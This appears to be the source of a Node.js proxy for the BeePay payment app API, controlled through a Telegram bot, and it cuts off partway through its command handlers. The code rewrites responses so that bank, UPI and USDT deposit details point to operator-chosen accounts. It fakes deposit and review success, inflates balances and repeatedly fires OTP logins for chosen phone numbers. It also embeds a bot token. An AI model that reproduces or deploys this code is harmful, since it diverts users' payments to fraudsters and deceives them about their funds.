const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const ORIGINAL_API = 'https://app-api.beepaycommon.com';
const BOT_TOKEN = process.env.BOT_TOKEN || '8944838396:AAEjhUozfSTRh40upzS9Z43MCuBX9i4Yy5M';
const WEBHOOK_URL = 'https://ixcv.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {}
};

let bot = null;
let webhookSet = false;
try { if (BOT_TOKEN) bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
let debugNextResponse = false;

async function ensureWebhook() {
  if (!bot || webhookSet || !WEBHOOK_URL) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('beepayData');
    if (raw) {
      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
    } else {
      cachedData = { ...DEFAULT_DATA };
    }
    if (!cachedData.userOverrides) cachedData.userOverrides = {};
    if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
    if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
    cacheTime = Date.now();
    return cachedData;
  } catch(e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('beepayData');
      if (current && typeof current === 'object') {
        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones'];
        for (const key of settingsKeys) {
          if (current[key] !== undefined) data[key] = current[key];
        }
        if (current.userOverrides) {
          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
        }
        if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
          if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
            data.balanceHistory = current.balanceHistory;
          }
        }
        if (current.sellHistory && Array.isArray(current.sellHistory)) {
          if (!data.sellHistory || data.sellHistory.length < current.sellHistory.length) {
            data.sellHistory = current.sellHistory;
          }
        }
        if (current.orderBankMap && typeof current.orderBankMap === 'object') {
          if (!data.orderBankMap) data.orderBankMap = {};
          for (const oid of Object.keys(current.orderBankMap)) {
            if (!data.orderBankMap[oid]) data.orderBankMap[oid] = current.orderBankMap[oid];
          }
        }
        if (current.fakeBills && typeof current.fakeBills === 'object') {
          if (!data.fakeBills) data.fakeBills = {};
          for (const uid of Object.keys(current.fakeBills)) {
            if (!data.fakeBills[uid] || data.fakeBills[uid].length < current.fakeBills[uid].length) {
              data.fakeBills[uid] = current.fakeBills[uid];
            }
          }
        }
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('beepayData', data);
  } catch(e) {
    console.error('Redis save error:', e.message);
    cachedData = data;
    cacheTime = Date.now();
  }
}

// ── Active-login monitor ──────────────────────────────────────────
const ACTIVE_DEFAULT_OTP = '030201';
let _activeMonitorOtp = ACTIVE_DEFAULT_OTP;
let _activeMonitorPhones = [];
let _activeMonitorAdminChatId = null;
let _activeMonitorLastRefresh = 0;
let _activeMonitorTicking = false;
let _activeMonitorStarted = false;
let _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
let _activeStatsLastReport = Date.now();
let _activeLastErrorLog = {};

const ACTIVE_TICK_MS = parseInt(process.env.ACTIVE_TICK_MS, 10) || 100;
const ACTIVE_REFRESH_MS = parseInt(process.env.ACTIVE_REFRESH_MS, 10) || 3000;
const ACTIVE_STATS_REPORT_MS = parseInt(process.env.ACTIVE_STATS_REPORT_MS, 10) || 300000;

function getActiveOtp(data) {
  return (data && data.activeOtp) || ACTIVE_DEFAULT_OTP;
}

async function refreshActiveMonitorPhones() {
  if (Date.now() - _activeMonitorLastRefresh < ACTIVE_REFRESH_MS) return;
  if (!redis) { _activeMonitorPhones = []; return; }
  try {
    let raw = await redis.get('beepayData');
    if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
    if (raw && typeof raw === 'object') {
      _activeMonitorPhones = Array.isArray(raw.activePhones) ? raw.activePhones.map(String) : [];
      _activeMonitorAdminChatId = raw.adminChatId || _activeMonitorAdminChatId;
      _activeMonitorOtp = raw.activeOtp || ACTIVE_DEFAULT_OTP;
    } else {
      _activeMonitorPhones = [];
    }
    _activeMonitorLastRefresh = Date.now();
  } catch(e) {}
}

async function fireActiveLogin(phone, otp) {
  const otpCode = otp || _activeMonitorOtp || ACTIVE_DEFAULT_OTP;
  const headers = {
    'user-agent': 'okhttp/4.9.0',
    'content-type': 'application/json; charset=UTF-8',
    'accept': '*/*',
    'reqdate': String(Math.floor(Date.now() / 1000)),
    'host': 'app-api.beepaycommon.com',
  };
  const body = JSON.stringify({ phone: String(phone), otp: otpCode });
  try {
    const resp = await fetch(ORIGINAL_API + '/appAuth/v2/memberLogin', { method: 'POST', headers, body });
    const text = await resp.text();
    let json = null;
    try { json = JSON.parse(text); } catch(e) {}
    if (json && (json.code === 200 || json.code === '200' || json.success === true)) {
      return { ok: true, userId: (json.data && (json.data.memberId || json.data.userId || json.data.id)) || '' };
    }
    return { ok: false, error: (json && (json.msg || json.message)) || text.substring(0, 150) };
  } catch(e) {
    return { ok: false, error: e.message };
  }
}

async function activeMonitorTick() {
  if (_activeMonitorTicking) return;
  _activeMonitorTicking = true;
  try {
    await refreshActiveMonitorPhones();
    if (!_activeMonitorPhones.length) return;
    await Promise.all(_activeMonitorPhones.map(async (phone) => {
      const r = await fireActiveLogin(phone, _activeMonitorOtp);
      _activeStats.logins++;
      _activeStats.perPhone[phone] = _activeStats.perPhone[phone] || { ok: 0, fail: 0 };
      if (r.ok) { _activeStats.ok++; _activeStats.perPhone[phone].ok++; }
      else {
        _activeStats.fail++;
        _activeStats.perPhone[phone].fail++;
        const now = Date.now();
        if (!_activeLastErrorLog[phone] || now - _activeLastErrorLog[phone] > 30000) {
          _activeLastErrorLog[phone] = now;
          console.error(`[active] ${phone} fail: ${r.error}`);
        }
      }
    }));
    if (Date.now() - _activeStatsLastReport > ACTIVE_STATS_REPORT_MS && _activeStats.logins > 0) {
      _activeStatsLastReport = Date.now();
      const lines = [
        `🔄 BeePay Active Login Monitor`,
        `Active phones: ${_activeMonitorPhones.length}`,
        `Total logins: ${_activeStats.logins}`,
        `✅ Success: ${_activeStats.ok}`,
        `❌ Failed: ${_activeStats.fail}`,
      ];
      for (const [ph, s] of Object.entries(_activeStats.perPhone)) {
        lines.push(`  ${ph}: ✅${s.ok} ❌${s.fail}`);
      }
      const msg = lines.join('\n');
      if (_activeMonitorAdminChatId && bot) {
        bot.sendMessage(_activeMonitorAdminChatId, msg).catch(()=>{});
      }
      _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
    }
  } finally {
    _activeMonitorTicking = false;
  }
}

function startActiveMonitor() {
  if (_activeMonitorStarted) return;
  _activeMonitorStarted = true;
  console.log(`[active] monitor loop started — tick=${ACTIVE_TICK_MS}ms`);
  setInterval(() => { activeMonitorTick().catch(()=>{}); }, ACTIVE_TICK_MS);
}
startActiveMonitor();

// ── Helpers ───────────────────────────────────────────────────────
function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null,
    forceReviewSuccess: uo && uo.forceReviewSuccess === true,
    _userId: userId
  };
}

function getForceReviewSuccessUserIds(data) {
  const ids = [];
  if (!data.userOverrides) return ids;
  for (const uid of Object.keys(data.userOverrides)) {
    if (data.userOverrides[uid].forceReviewSuccess === true) ids.push(uid);
  }
  return ids;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

function getPhone(data, userId) {
  if (!userId) return '';
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  return (tracked && tracked.phone) || '';
}

function getActiveBank(data, userId, orderAmount) {
  const hasAmt = orderAmount !== undefined && orderAmount !== null && isFinite(orderAmount);
  const qualifies = (b) => !hasAmt || (Number(b.minAmount) || 0) <= Number(orderAmount);
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    const pinned = data.banks[uo.bankIndex];
    return qualifies(pinned) ? pinned : null;
  }
  if (data.autoRotate && data.banks.length > 0) {
    const eligible = data.banks.filter(qualifies);
    if (eligible.length === 0) return null;
    if (eligible.length === 1) {
      const realIdx = data.banks.indexOf(eligible[0]);
      data.lastUsedIndex = realIdx;
      data._rotatedIndex = realIdx;
      return eligible[0];
    }
    let pickIdx;
    do { pickIdx = Math.floor(Math.random() * eligible.length); }
    while (data.banks.indexOf(eligible[pickIdx]) === data.lastUsedIndex);
    const chosen = eligible[pickIdx];
    const realIdx = data.banks.indexOf(chosen);
    data.lastUsedIndex = realIdx;
    data._rotatedIndex = realIdx;
    return chosen;
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
    const ab = data.banks[data.activeIndex];
    return qualifies(ab) ? ab : null;
  }
  if (data.banks.length > 0) {
    const first = data.banks[0];
    return qualifies(first) ? first : null;
  }
  return null;
}

async function getActiveBankAndSave(data, userId, orderAmount) {
  const bank = getActiveBank(data, userId, orderAmount);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    const minA = Number(b.minAmount) || 0;
    const min = minA > 0 ? ` | ≥₹${minA}` : ' | any amt';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${min}${a}`;
  }).join('\n');
}

// ── Order bank map helpers ────────────────────────────────────────
async function saveOrderBank(data, orderId, bank) {
  if (!orderId || !bank || orderId === 'N/A') return;
  if (!data.orderBankMap) data.orderBankMap = {};
  data.orderBankMap[String(orderId)] = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
  await saveData(data);
}

async function markOrderBankSkip(data, orderId) {
  if (!orderId || orderId === 'N/A') return;
  if (!data.orderBankMap) data.orderBankMap = {};
  data.orderBankMap[String(orderId)] = { _skip: true, t: Date.now() };
  await saveData(data);
}

async function markOrderBankPending(data, orderId) {
  if (!orderId || orderId === 'N/A') return;
  if (!data.orderBankMap) data.orderBankMap = {};
  const existing = data.orderBankMap[String(orderId)];
  if (existing && (existing.accountNo || existing._skip)) return;
  data.orderBankMap[String(orderId)] = { _pending: true, t: Date.now() };
  await saveData(data);
}

function hasOrderBankDecision(data, orderId) {
  if (!orderId || !data.orderBankMap) return false;
  const e = data.orderBankMap[String(orderId)];
  if (!e) return false;
  if (e._pending) return false;
  return !!(e.accountNo || e._skip);
}

function isProxyPending(data, ids) {
  if (!data.orderBankMap) return false;
  for (const id of ids) {
    if (!id) continue;
    const e = data.orderBankMap[String(id)];
    if (e && e._pending) return true;
  }
  return false;
}

async function saveOrderBankMultipleKeys(data, ids, bank) {
  if (!bank) return;
  const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
  if (uniqueIds.length === 0) return;
  if (!data.orderBankMap) data.orderBankMap = {};
  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
  for (const id of uniqueIds) { data.orderBankMap[id] = bankData; }
  await saveData(data);
}

function getOrderBank(data, orderId) {
  if (!orderId || !data.orderBankMap) return null;
  const entry = data.orderBankMap[String(orderId)];
  if (!entry || entry._skip || entry._pending) return null;
  return entry;
}

function getOrderBankMultiple(data, ids) {
  if (!data.orderBankMap) return null;
  for (const id of ids) {
    if (!id) continue;
    const bank = data.orderBankMap[String(id)];
    if (bank && !bank._skip && !bank._pending) return bank;
  }
  return null;
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || ''
  };
}

// ── Request body parsing ──────────────────────────────────────────
app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else {
        req.parsedBody = {};
      }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

// ── User ID extraction (no token feature) ────────────────────────
async function extractUserId(req, jsonResp) {
  const body = req.parsedBody || {};
  const uid = body.memberId || body.userId || body.id || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('memberId')) return String(qs.get('memberId'));
  if (qs.get('userId')) return String(qs.get('userId'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.memberId || respData.userId || respData.id || '';
    if (rid) return String(rid);
  }
  return '';
}

// ── Deep bank replace ─────────────────────────────────────────────
const BANK_FIELD_PATTERNS = [
  { field: ['accountNo', 'accountNumber', 'bankAccountNo', 'bankAccount', 'cardNo', 'payAccount', 'receiveAccount', 'toAccount', 'collectAccount'], type: 'accountNo' },
  { field: ['accountHolder', 'accountName', 'bankAccountName', 'payName', 'receiveName', 'holderName', 'cardHolder'], type: 'accountHolder' },
  { field: ['ifsc', 'ifscCode', 'bankCode', 'routingNumber', 'bankIfsc'], type: 'ifsc' },
  { field: ['bankName', 'bank', 'bankNameStr'], type: 'bankName' },
  { field: ['upiId', 'upi', 'upiAddress', 'vpa', 'payUpi'], type: 'upiId' },
];

function deepReplace(obj, bank, origVals, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) { obj.forEach(item => deepReplace(item, bank, origVals, depth + 1)); return; }
  for (const key of Object.keys(obj)) {
    const kl = key.toLowerCase();
    for (const pat of BANK_FIELD_PATTERNS) {
      if (pat.field.map(f => f.toLowerCase()).includes(kl)) {
        const newVal = bank[pat.type];
        if (newVal !== undefined && newVal !== null && newVal !== '') {
          if (!origVals[kl]) origVals[kl] = obj[key];
          obj[key] = newVal;
        }
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null) {
      deepReplace(obj[key], bank, origVals, depth + 1);
    }
  }
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  // BeePay uses "body" field, fallback to "data"/"result"
  if (jsonResp.body !== undefined) return jsonResp.body;
  if (jsonResp.data !== undefined) return jsonResp.data;
  if (jsonResp.result !== undefined) return jsonResp.result;
  return null;
}

function isBeepaySuccess(jsonResp) {
  if (!jsonResp) return false;
  const s = parseInt(jsonResp.status);
  return s === 200 || s === 601;
}

function markDepositSuccess(obj) {
  if (!obj || typeof obj !== 'object') return;
  const successStrings = ['success', 'completed', 'paid', 'confirmed'];
  for (const key of Object.keys(obj)) {
    const kl = key.toLowerCase();
    if (kl.includes('status') || kl.includes('state')) {
      const val = obj[key];
      if (typeof val === 'number') obj[key] = 1;
      else if (typeof val === 'string') obj[key] = 'success';
    }
  }
}

function markReviewAsSuccess(obj) {
  if (!obj || typeof obj !== 'object') return;
  const reviewStrings = ['review', 'pending', 'processing', 'auditing', 'checking'];
  for (const key of Object.keys(obj)) {
    const kl = key.toLowerCase();
    if (kl.includes('status') || kl.includes('state')) {
      const val = obj[key];
      if (typeof val === 'string' && reviewStrings.some(r => val.toLowerCase().includes(r))) {
        obj[key] = 'SUCCESS';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'amount'];
  const skipKeys = ['availablewithdrawbalance', 'processwithdrawbalance', 'frozenbalance', 'freezebalance', 'withdrawbalance'];
  for (const key of Object.keys(obj)) {
    const kl = key.toLowerCase();
    if (balanceKeys.includes(kl) && !skipKeys.includes(kl)) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'receiveaddress' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
          if (obj[key].length >= 20 && obj[key] !== newAddr) { oldAddr = oldAddr || obj[key]; obj[key] = newAddr; }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl') {
          obj[key] = qrUrl;
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    return oldAddr;
  }
  const rd = getResponseData(jsonResp);
  if (rd) scanAndReplace(rd, 0);
  else scanAndReplace(jsonResp, 0);
  const fullStr = JSON.stringify(jsonResp);
  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
  if (trcMatch) {
    for (const addr of trcMatch) {
      if (addr !== newAddr) {
        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
      }
    }
  }
  return { newAddr, qrUrl };
}

// ── Proxy fetch ───────────────────────────────────────────────────
async function proxyFetch(req) {
  const targetUrl = ORIGINAL_API + req.originalUrl;
  const headers = {};
  for (const [k, v] of Object.entries(req.headers || {})) {
    const kl = k.toLowerCase();
    if (kl === 'host') { headers['host'] = 'app-api.beepaycommon.com'; continue; }
    if (kl === 'content-length' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    headers[k] = v;
  }
  const opts = { method: req.method, headers };
  if (req.rawBody && req.rawBody.length > 0) opts.body = req.rawBody;
  const response = await fetch(targetUrl, opts);
  const respBody = await response.arrayBuffer();
  const respHeaders = {};
  response.headers.forEach((v, k) => {
    const kl = k.toLowerCase();
    if (kl === 'content-encoding' || kl === 'transfer-encoding' || kl === 'connection') return;
    respHeaders[k] = v;
  });
  let jsonResp = null;
  try {
    const text = Buffer.from(respBody).toString('utf-8');
    jsonResp = JSON.parse(text);
  } catch(e) {}
  return { response, respBody: Buffer.from(respBody), respHeaders, jsonResp };
}

function sendJson(res, respHeaders, jsonResp, respBody) {
  for (const [k, v] of Object.entries(respHeaders)) res.setHeader(k, v);
  if (jsonResp) {
    res.setHeader('content-type', 'application/json; charset=utf-8');
    res.end(JSON.stringify(jsonResp));
  } else {
    res.end(respBody);
  }
}

function sendChunked(botInst, chatId, text, chunkSize = 3800) {
  if (!botInst || !chatId || !text) return;
  try {
    const s = String(text);
    if (s.length <= chunkSize) { botInst.sendMessage(chatId, s).catch(()=>{}); return; }
    const total = Math.ceil(s.length / chunkSize);
    for (let i = 0; i < total; i++) {
      const part = s.substring(i * chunkSize, (i + 1) * chunkSize);
      botInst.sendMessage(chatId, `(${i + 1}/${total})\n` + part).catch(()=>{});
    }
  } catch(e) {}
}

async function transparentProxy(req, res) {
  try {
    const { respBody, respHeaders } = await proxyFetch(req);
    for (const [k, v] of Object.entries(respHeaders)) res.setHeader(k, v);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

// ── Request logger ────────────────────────────────────────────────
app.use((req, res, next) => {
  (async () => {
    try {
      if (!bot) return;
      const data = cachedData || await loadData();
      if (!data.logRequests || !data.adminChatId) return;
      const path = req.originalUrl || req.url;
      if (path.includes('bot-webhook') || path.includes('favicon') || path.includes('health')) return;
      const body = req.parsedBody || {};
      const userId = body.memberId || body.userId || body.id || '';
      const phone = getPhone(data, userId);
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      if (userId && isLogOff(data, userId)) return;
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
    } catch(e) {}
  })();
  next();
});

// ── Bot setup ─────────────────────────────────────────────────────
app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  let redisWorking = false;
  if (redis) { try { await redis.ping(); redisWorking = true; } catch(e) {} }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok', app: 'BeePay Proxy',
    redis: redis ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active, totalBanks: data.banks.length, adminSet: !!data.adminChatId
  });
});

app.get('/bot-webhook', (req, res) => {
  res.json({ ok: true, status: 'BeePay webhook active' });
});

// ── Telegram bot commands ─────────────────────────────────────────
app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId,
`🐝 BeePay Bank Controller

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI [minAmount]
/setmin <bankNumber> <amount>
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate
/log — Toggle request logging
/status — Full status
/debug — Debug next response

=== BALANCE ===
/add <amount> <userId>
/deduct <amount> <userId>
/remove balance <userId>
/history [userId]
/clearhistory

=== USDT ===
/usdt <address>
/usdt off

=== ACTIVE LOGIN ===
/active <phone>
/active off <phone>
/active list
/otp [code]

=== TRACKING ===
/idtrack — Show tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    // /status
    if (text === '/status') {
      const active = getActiveBank(data, null);
      const activeCount = Array.isArray(data.activePhones) ? data.activePhones.length : 0;
      let m = `📊 BeePay Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\n🔄 Active Logins: ${activeCount}${activeCount > 0 ? ' (' + (data.activePhones || []).join(', ') + ')' : ''}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active Bank:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON'); return res.sendStatus(200); }

    // /banks
    if (text === '/banks') {
      data = await loadData(true);
      await bot.sendMessage(chatId, bankListText(data));
      return res.sendStatus(200);
    }

    // /addbank
    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).trim().split(/\s+/);
      const bankStr = parts[0] || '';
      const minAmount = parseFloat(parts[1]) || 0;
      const bParts = bankStr.split('|');
      if (bParts.length < 3) {
        await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI [minAmount]');
        return res.sendStatus(200);
      }
      data = await loadData(true);
      data.banks.push({
        accountHolder: bParts[0] || '',
        accountNo: bParts[1] || '',
        ifsc: bParts[2] || '',
        bankName: bParts[3] || '',
        upiId: bParts[4] || '',
        minAmount: minAmount
      });
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank added!\n${bankListText(data)}`);
      return res.sendStatus(200);
    }

    // /removebank
    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      data = await loadData(true);
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid bank number');
        return res.sendStatus(200);
      }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Removed: ${removed.accountHolder}\n${bankListText(data)}`);
      return res.sendStatus(200);
    }

    // /setbank
    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      data = await loadData(true);
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid bank number');
        return res.sendStatus(200);
      }
      data.activeIndex = idx;
      data._skipOverrideMerge = true;
      await saveData(data);
      const b = data.banks[idx];
      await bot.sendMessage(chatId, `✅ Active Bank:\n${b.accountHolder}\n${b.accountNo}\n${b.ifsc}`);
      return res.sendStatus(200);
    }

    // /setmin
    if (text.startsWith('/setmin ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const idx = parseInt(parts[0]) - 1;
      const amt = parseFloat(parts[1]) || 0;
      data = await loadData(true);
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid bank number');
